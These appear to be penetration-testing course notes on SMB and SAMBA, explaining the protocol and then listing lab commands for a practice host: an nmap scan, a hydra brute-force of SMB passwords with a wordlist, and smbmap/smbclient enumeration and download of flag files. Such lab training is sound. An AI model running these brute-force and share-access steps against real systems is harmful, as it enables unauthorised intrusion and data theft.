- SMB (Server Message Block) is a network sharing protocol that is used to facilitate the sharing of files and peripherals, like printers, between computers on a local network (LAN)
- Originally, on older version of Windows, SMB ran on top of NetBIOS using port tcp/139, and was available on both tcp/139 and tcp/445. However on newer version on Windows, SMB is usually found on port tcp/445.
- SAMBA is the Linux implementation of SMB, which allows Windows systems to access Linux shares and devices.

Null Session Misconfiguration
- A security misconfiguration present in SAMBA, using which an attacker can authenticate and enumerate the shares without providing any valid credentials.
- Null Session Misconfiguration is not very widely found on modern systems, so it is being skipped in this section of the course, but can be researched about if and when needed.

SAMBA Exploitation
- SAMBA utilizes username and password authentication in order to obtain access to the server or a network share.
- We can perform a brute-force attack on the SAMBA server in order to obtain legitimate credentials.
- After obtaining legitimate credentials, we can use a utility called SMBMap in order to enumerate SAMBA share drives, list the contents of the share as well as download files and execute remote commands on the target.
- We can also utilize a tool called smbclient, smbclient is a client that is part of the SAMBA software suite. It communicates with a LAN Manager server, offering an interface similar to that of the ftp program. It can be used to download files from the server to the local machine, upload files from the local machine to the server, as well as retrieve directory information from the server.
- Enum4Linux is a tool that can be used to perform extensive enumeration on the SAMBA service, especially with administrative privileges.

Practical Demonstration
- `nmap -sV demo.ine.local`
- `hydra -L admin -P /usr/share/metasploit-framework/data/wordlists/unix_passwords.txt demo.ine.local smb`
- `smbmap`
- `smbmap -H demo.ine.local -u admin -p password1`
- `smbclient`
- `man smbclient`
- `smbclient -L demo.ine.local -U admin`
- `smbclient -L //demo.ine.local/shawn -U admin`
	- `?`
	- `dir`
	- `exit`
- `smbclient -L //demo.ine.local/nancy -U admin`
	- `dir`
	- `cd dir`
	- `dir`
	- `get flag`
	- `exit`
- `cat flag`
- `smbclient -L //demo.ine.local/admin -U admin`
	- `dir`
	- `cd hidden`
	- `get flag.tar.gz`
	- `exit`
- `ls`
- `mv flag flag1`
- `tar xzf flag.tar.gz`
- `ls`
